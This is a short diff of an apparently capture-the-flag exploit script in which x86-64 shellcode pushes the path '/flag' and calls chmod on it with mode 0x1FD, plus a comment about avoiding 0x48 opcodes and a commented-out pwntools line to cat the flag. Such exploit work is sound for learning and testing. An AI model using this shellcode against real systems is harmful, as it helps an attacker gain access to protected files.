@@ -15,9 +15,10 @@ shellcode=f"""
 mov rax, 0x67616c662f
 push rax
 mov rdi, rsp
-mov rsi, {u32(b"0777")}
+mov rsi, 0x1FD /* mode_t https://godbolt.org/z/d4TrTzP9G */
 mov rax, SYS_chmod
 syscall
+mov     eax, 0
 """
 # both not working, how to prevent 48 opcode in 64 bit mode? 
 #shellcode=pwnlib.shellcraft.i386.linux.cat("/flag")
